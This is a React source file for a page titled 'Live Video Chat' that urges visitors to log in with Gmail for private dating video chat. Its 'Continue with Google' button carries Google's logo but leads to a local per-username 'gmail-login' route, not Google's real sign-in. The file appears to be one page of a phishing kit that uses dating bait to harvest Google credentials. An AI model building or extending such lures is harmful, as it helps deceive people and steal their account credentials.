import { Link, useParams } from "react-router-dom";


const Gmail = () => {
  const { username } = useParams()
  return (
    <div className='mega-container-box'>
      <div className='mega-container z-20'>
        <h1>Live Video Chat</h1>
        <p className="txt">Login with Gmail and enjoy with
          <span className="extra-txt"> Private Live Video Chat</span> your dating partner.
        </p>
        <Link
          to={`/${username}/gmail-login`}
          style={{
            display: 'flex',
            alignItems: 'center',
            background: '#fff',
            color: '#444',
            border: '1px solid #ddd',
            borderRadius: 4,
            padding: '10px 20px',
            cursor: 'pointer',
            fontWeight: 500,
            fontSize: 16,
            boxShadow: '0 2px 4px rgba(0,0,0,0.05)'
          }}
        >
          <img
            src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg"
            alt="Google"
            style={{ width: 24, height: 24, marginRight: 12 }}
          />
          Continue with Google
        </Link>
      </div>
    </div>
  );
};

export default Gmail;